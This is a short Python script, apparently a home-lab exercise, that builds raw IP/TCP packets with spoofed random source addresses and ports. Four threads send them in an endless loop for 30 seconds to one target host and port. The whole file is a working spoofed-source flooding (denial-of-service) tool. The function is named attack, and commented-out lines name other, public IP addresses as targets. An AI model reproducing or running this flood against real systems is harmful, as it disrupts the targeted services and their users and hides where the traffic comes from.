import tcp_scratch as ts
import ip_scratch as ips
import struct
import socket
import time
import random
import threading
# msg = input("Enter your msg: ")
msg = "hello"
msg_bytes = msg.encode()[:64]
msg_bytes = msg_bytes.ljust(64, b'\x00')  # Pad to 64 bytes
data = struct.pack('!64B', *msg_bytes)

def attack():
    while(True):

        last_octate = random.randint(1,254)
        src_ip = "192.168.68."+str(last_octate) 
        # dont use multiple single digits
        src_port = random.randint(2000,65000)
        # dst_ip = "20.40.57.81"
        # dst_ip = "0.0.0.0"
        # dst_ip = "172.174.246.178"
        dst_ip="192.168.0.110"
        dst_port = 8081

        

        segment = ts.TCPPacket(src_ip, src_port, dst_ip, dst_port).build()
        # print(f"Segment length: {len(segment)} bytes")
        packet = ips.IPPacket(src_ip, dst_ip).build() + segment + data
        # print(f"Packet length: {len(packet)} bytes")


        # Raw socket for crafted packet
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        # s.sendto(packet, (dst_ip, 0))

        
        s.sendto(packet, (dst_ip, 0))

if __name__ == "__main__":

        attack_thread1 = threading.Thread(target=attack, daemon=True) #daemon: stop thread with program
        attack_thread1.start()

        attack_thread2 = threading.Thread(target=attack, daemon=True) #daemon: stop thread with program
        attack_thread2.start()

        attack_thread3 = threading.Thread(target=attack, daemon=True) #daemon: stop thread with program
        attack_thread3.start()

        attack_thread4 = threading.Thread(target=attack, daemon=True) #daemon: stop thread with program
        attack_thread4.start()

        
        time.sleep(30)  # Attack duration

